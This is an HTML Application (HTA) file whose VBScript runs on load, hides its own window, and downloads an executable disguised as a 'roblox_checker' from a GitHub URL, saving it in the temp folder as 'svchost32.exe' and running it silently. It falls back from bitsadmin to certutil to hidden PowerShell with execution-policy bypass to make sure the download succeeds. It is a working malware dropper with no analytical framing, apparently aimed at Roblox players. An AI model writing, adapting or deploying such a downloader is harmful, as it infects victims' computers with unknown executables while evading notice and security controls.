<html>
<head>
<HTA:APPLICATION ID="x" APPLICATIONNAME="x" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize"/>
<script language="VBScript">
Sub Window_onLoad
    window.resizeTo 0,0
    window.moveTo -2000,-2000

    Dim sh
    Set sh = CreateObject("WScript.Shell")
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")

    Dim dl
    dl = "https://github.com/sasukeuchicaj-debug/lolol/raw/refs/heads/main/roblox_checker.exe"
    Dim tmp
    tmp = sh.ExpandEnvironmentStrings("%TEMP%") & "\svchost32.exe"

    ' method 1: bitsadmin
    sh.Run "bitsadmin /transfer job /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & tmp & Chr(34), 0, True

    ' method 2: certutil fallback
    If Not fso.FileExists(tmp) Then
        sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & tmp & Chr(34), 0, True
    End If

    ' method 3: powershell fallback
    If Not fso.FileExists(tmp) Then
        sh.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command (New-Object Net.WebClient).DownloadFile('" & dl & "','" & tmp & "')", 0, True
    End If

    If fso.FileExists(tmp) Then
        sh.Run Chr(34) & tmp & Chr(34), 0, False
    End If

    window.close
End Sub
</script>
</head>
<body></body>
</html>
